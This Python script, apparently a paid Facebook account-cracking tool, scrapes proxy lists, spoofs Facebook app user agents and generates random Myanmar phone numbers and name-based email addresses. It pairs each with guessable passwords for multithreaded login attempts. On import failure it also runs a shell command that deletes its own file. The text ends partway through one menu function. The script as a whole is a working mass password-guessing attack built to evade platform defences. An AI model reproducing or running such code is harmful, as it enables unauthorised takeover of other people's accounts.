import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('rm -rf mail_clone.py')
loop = 0
oks = []
cps = []
ugen=[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
for x in range(10000):
    ua_string="FBAN/FB4A;FBAV/"+str(random.choice(range(100,300)))+".0.0."+str(random.choice(range(4,50)))+"."+str(random.choice(range(4,195)))+";FBBV/"+str(random.choice(range(150999999,999999999)))+";FBDM/{density=5.8,width=875,height=1158};FBLC/en_GB;FBRV/"+str(random.choice(range(150999999,999999999)))+";FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981N;FBSV/8.5;FBOP/1;FBCA/arm64-v8a"
    se=f'{ua_string}'
    ugen.append(se)
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
def uaa():
    android_versions = list(range(4, 13))
    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
    vivo_models = ['Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
    android_models = {
        'samsung': samsung_models,
        'huawei': huawei_models,
        'xiaomi': xiaomi_models,
        'oppo': oppo_models,
        'vivo': vivo_models,
        'realme': realme_models,
    }
    and_vers = random.choice(android_versions)
    brand = random.choice(list(android_models.keys()))
    and_mod = random.choice(android_models[brand])
    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
    app_vercode = str(random.randint(100000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
    return ua
ua = [
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/117.0.0.36.70;FBBV/57539258;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/AT&amp;T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]",
"Mozilla/5.0 (Linux; Android 13; Infinix X6835 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]",
"Mozilla/5.0 (Linux; Android 11; Infinix X675 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13C75 [FBAN/MessengerForiOS;FBAV/118.0.0.44.65;FBBV/58362889;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13C75 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2;FBSS/2;FBCR/Viettel;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/76.0.0.31.70;FBBV/32346928;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E233 [FBAN/MessengerForiOS;FBAV/66.0.0.26.68;FBBV/27396299;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3;FBSS/3;FBCR/Koodo;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/83.0.0.25.68;FBBV/35718857;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/117.0.0.36.70;FBBV/57539258;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/AT&amp;T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.3;FBSS/2;FBCR/IAM;FBID/phone;FBLC/fr_FR;FBOP/5]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]",
"Mozilla/5.0 (Linux; Android 4.4.2; 1201 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88;]",
"Mozilla/5.0 (Linux; Android 5.0.1; SGH-I337M Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]",
"Mozilla/5.0 (Linux; Android 5.0.2; D6503 Build/23.1.A.1.28; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SF1 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SM-A500H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/124.0.0.43.69;]",
"Mozilla/5.0 (Linux; Android 5.0; LG-D855 Build/LRX21R.A1445306351; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/106.0.0.17.70;]",
"Mozilla/5.0 (Linux; Android 5.0; SM-N900L Build/LRX21V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]",
"Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9.84;]",
"Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/127.0.0.18.81;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-G530AZ Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]",
    ]

ugen = ["Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"]
ugen = [ "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]"]
ua = [" FBAN/FB4A;FBAV/8643.0.0.88.126;FBBV/63582484033;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/Greenberry 71606Y;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.4,width=2874,height=2938};FB_FW/1",]
ua = [" FBAN/FB4A;FBAV/236.0.0.42.195;FBBV/38330549;FBDM/{density=5.8,width=875,height=1158};FBLC/en_GB;FBRV/48809099;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981N;FBSV/8.5;FBOP/1;FBCA/arm64-v8a",]
ua = [" FBAN/FB4A;FBAV/242.0.0.43.119;FBBV/176515222;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/177156964;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",]
ua = [" [BAN/FB4A;FBAV/3631.0.0.211.9[FBAN/FB4A;FBAV/9775.0.0.88.260;FBBV/88889851481;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/AMD Radeon 46400I;FBSV/3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.8,width=1023,height=3179};FB_FW/1",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; Nokia 1.3 Build/QKQ1.191008.001) [FBAN/FBIOS;FBDV/Nokia6600;FBMD/Nokia;FBSN/IOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/MessengerForiOS;FBAV/117.0.0.36.70;FBBV/57539258;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/2;FBCR/AT&amp;T;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6835 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X675 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]",]
nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]   
####------------logo----------
main_menu= ("""
\033[1;93m  ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗  ╦ ╦╔═╗╔═╗╦═╗
\033[1;97m  ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║  ║ ║╚═╗║╣ ╠╦╝
\033[1;32m  ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  ╚═╝╚═╝╚═╝╩╚═
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEDITOR       \033[1;32m  ║ \033[1;32mZWE-LAY          
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTELEGRAM    \033[1;32m   ║ \033[1;32mWAI-LIN-OO    
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mSTATUS       \033[1;32m  ║ \033[1;32mMIX CLONE        
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTOOL VERSION \033[1;32m  ║ \033[1;32m18+\033[1;32m〘PAID〙
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═ """)
def linex():
	print(f' \033[1;97m═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═')
	
	####first name####
firsta= ("""
\033[1;93m          ╔═╗╦╦═╗╔═╗╔╦╗  ╔╗╔╔═╗╔╦╗╔═╗
\033[1;97m          ╠╣ ║╠╦╝╚═╗ ║   ║║║╠═╣║║║║╣ 
\033[1;32m          ╚  ╩╩╚═╚═╝ ╩   ╝╚╝╩ ╩╩ ╩╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

####last#####
lastna= ("""
\033[1;93m          ╦  ╔═╗╔═╗╔╦╗  ╔╗╔╔═╗╔╦╗╔═╗
\033[1;97m          ║  ╠═╣╚═╗ ║   ║║║╠═╣║║║║╣ 
\033[1;32m          ╩═╝╩ ╩╚═╝ ╩   ╝╚╝╩ ╩╩ ╩╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

#######full name ##.#######"#
singlea= ("""
\033[1;93m         ╔═╗╦╔╗╔╔═╗╦  ╔═╗  ╔╗╔╔═╗╔╦╗╔═╗
\033[1;97m         ╚═╗║║║║║ ╦║  ║╣   ║║║╠═╣║║║║╣ 
\033[1;32m         ╚═╝╩╝╚╝╚═╝╩═╝╚═╝  ╝╚╝╩ ╩╩ ╩╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")
###--------domain---------###
domaina= ("""
\033[1;93m         ╦╔╗╔╔═╗╦ ╦╔╦╗  ╔╦╗╔═╗╔╦╗╔═╗╦╔╗╔
\033[1;97m         ║║║║╠═╝║ ║ ║    ║║║ ║║║║╠═╣║║║║
\033[1;32m         ╩╝╚╝╩  ╚═╝ ╩   ═╩╝╚═╝╩ ╩╩ ╩╩╝╚╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")

###------limit-----------####
limita= ("""
\033[1;93m         ╔═╗╦═╗╔═╗╔═╗╦╔═  ╦  ╦╔╦╗╦╔╦╗
\033[1;97m         ║  ╠╦╝╠═╣║  ╠╩╗  ║  ║║║║║ ║ 
\033[1;32m         ╚═╝╩╚═╩ ╩╚═╝╩ ╩  ╩═╝╩╩ ╩╩ ╩ 
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")
#------------codea---------------------#
codea= ("""
\033[1;93m           ╦ ╦╔═╗╦ ╦╦═╗  ╔═╗╔═╗╔╦╗╔═╗
\033[1;97m           ╚╦╝║ ║║ ║╠╦╝  ║  ║ ║ ║║║╣ 
\033[1;32m            ╩ ╚═╝╚═╝╩╚═  ╚═╝╚═╝═╩╝╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")
######------start cracking------
starta= ("""\033[1;32m
\033[1;93m    ╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╔═╗╦═╗╔═╗╔═╗╦╔═╦╔╗╔╔═╗
\033[1;97m    ╚═╗ ║ ╠═╣╠╦╝ ║   ║  ╠╦╝╠═╣║  ╠╩╗║║║║║ ╦
\033[1;32m    ╚═╝ ╩ ╩ ╩╩╚═ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEDITOR       \033[1;32m  ║ \033[1;32mZWE-LAY          
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTELEGRAM    \033[1;32m   ║ \033[1;32mWAI-LIN-OO    
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mSTATUS       \033[1;32m  ║ \033[1;32mMIX CLONE        
\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mTOOL VERSION \033[1;32m  ║ \033[1;32m18+\033[1;32m〘PAID〙  
\033[1;97m ═\033[1;32m═════════════════════\033[1;97m═\033[1;32m═════════════════════\033[1;97m═""")
#----------------main-------------	
def main():
    os.system('clear')
    print(main_menu)
    print("  \033[1;32m〘\033[1;97m1\033[1;32m〙 \033[1;97mPHONE NUMBER CRACKING")
    print("  \033[1;32m〘\033[1;97m2\033[1;32m〙 \033[1;97mGMAIL CRACKING〘\033[1;32mFULL\033[1;97m〙")
    print("  \033[1;32m〘\033[1;97m3\033[1;32m〙 \033[1;97mGMAIL CRACKING〘\033[1;32mSINGLE\033[1;97m〙")
    print("  \033[1;32m〘\033[1;97m0\033[1;32m〙 \033[1;97mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  〘\033[1;97m?\033[1;32m〙 \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail()
    if ZWE in ["3","03"]:
        single()
    if ZWE in ["0","X"]:        
        os.system('exit')

        ######def phone-----------####
def phone():
    user=[]
    os.system('clear')
    print(codea)
    print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97m EXAMPLE : \033[1;32m〘\033[1;97m786\033[1;32m〙〘\033[1;97m440\033[1;32m〙〘\033[1;97m678\033[1;32m〙〘\033[1;97m699\033[1;32m〙")
    linex()
    code = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(limita)
    print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
    linex()
    limit=int(input("\033[1;32m  〘\033[1;32m?\033[1;32m〙\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as LEE:
        os.system('clear')
        print(starta)
        tl = str(len(user))
        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m ║ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCHOICE CODE    \033[1;32m ║ \033[1;32m'+code+'             ')
        print(f" \033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        for love in user:
            uid = '+959'+code+love
            pwx = [love,code+love,code+love[0:3]]
            LEE.submit(rcrack,uid,pwx,tl)        
#---------------def mail----------===       
def gmail():
                user=[]
                os.system('clear')
                print(firsta)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mtun\033[1;32m〙〘\033[1;97mzaw\033[1;32m〙〘\033[1;97maung\033[1;32m〙")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(lastna)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mlin\033[1;32m〙〘\033[1;97mhtet\033[1;32m〙〘\033[1;97mmin\033[1;32m〙")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(domaina)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m@gmail.com\033[1;32m〙〘\033[1;97m@yahoo.com\033[1;32m〙")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(limita)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=30) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(starta)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID        \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME      \033[1;32m║ \033[1;32m'+first+last+'')
                        print(f" \033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=random.choice([first+last+'.'+digitx+domain,first+last[0:1]+'.'+digitx+domain,last+first+'.'+digitx+domain])
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)
 #----------def singel------------#                               
def single():
                user=[]
                os.system('clear')
                print(singlea)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mwailin\033[1;32m〙〘\033[1;97mzawmyo\033[1;32m〙〘\033[1;97mphyowai\033[1;32m〙")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mSINGLE NAME :\033[1;32m ')
                os.system('clear')
                print(domaina)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m@gmail.com\033[1;32m〙〘\033[1;97m@yahoo.com\033[1;32m〙")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(limita)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=40) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(starta)
